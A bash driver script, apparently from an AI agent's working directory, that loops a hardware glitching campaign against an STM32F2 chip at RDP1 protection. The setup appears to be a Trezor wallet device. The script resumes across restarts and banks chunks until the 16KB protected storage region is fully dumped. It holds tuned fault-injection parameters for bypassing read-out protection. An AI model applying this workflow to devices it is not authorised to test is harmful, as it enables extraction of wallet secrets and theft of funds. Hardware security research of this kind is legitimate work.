#!/bin/bash
# Full 16KB storage dump, robust across process restarts. A persistent ACCUM
# dir gathers every banked (non-bad) chunk; each run resumes from ACCUM (so no
# progress is ever lost) and its new banks are merged back. Stops when all 64
# storage chunks are in ACCUM and assembles storage_dump.bin.
# us 180-186, rep6-7, scope OFF. STM32F2 @ RDP1, planted.
set -u
cd /home/tdaly/trezor-btc/storage-sim
LOG=/tmp/opencode/fulldump_loop.log
ACCUM=dumps/accum
PY=/home/tdaly/.cwvenv/bin/python
mkdir -p "$ACCUM"
merge(){ for d in "$@"; do [ -d "$d" ] || continue
  for f in "$d"/*.bin; do case "$f" in *.bad.bin) continue;; esac
    [ -f "$f" ] && cp -n "$f" "$ACCUM/" 2>/dev/null; done; done; }
while true; do
  merge dumps/run_*                     # fold everything banked so far into ACCUM
  SC=$(ls "$ACCUM"/storage_*.bin 2>/dev/null | wc -l)
  N=$(ls "$ACCUM"/*.bin 2>/dev/null | grep -vc '\.bad\.bin$')
  if [ "$SC" -ge 64 ]; then
    $PY -I -c "open('$ACCUM/storage_dump.bin','wb').write(b''.join(open('$ACCUM/storage_%04d.bin'%i,'rb').read() for i in range(64)))"
    echo "=== *** FULL 16KB STORAGE DUMP COMPLETE -> $ACCUM/storage_dump.bin ($(stat -c %s $ACCUM/storage_dump.bin) B) ***" | tee -a "$LOG"; break
  fi
  echo "=== FULLDUMP run  accum=$N/66 (storage $SC/64)  $(date '+%H:%M:%S') ===" | tee -a "$LOG"
  G_CLKGEN=166666667 G_OFFSET=-45 G_WIDTH=5 G_US_MIN=180.3 G_US_MAX=181.8 G_US_STEP=0.006 \
  G_RND_REP=1 G_REPEATS=6 G_RND_LO=33 G_RND_HI=45 G_SAMPLES=3 G_COOLDOWN=0.15 G_REST_S=0 \
  G_RESET_EVERY=1 G_FULL=1 G_PASSES=200 G_SHOTS=2000000 G_RESUME="$ACCUM" G_TAG=fulldump \
  $PY -u rdp1_glitch_campaign_full_mem_dump.py 2>&1 | tee -a "$LOG"
  merge dumps/run_*                     # fold this run's new banks into ACCUM
  echo "=== process ended, accum now $(ls $ACCUM/*.bin 2>/dev/null|grep -vc '\.bad\.bin$')/66, relaunching ===" | tee -a "$LOG"
  sleep 3
done
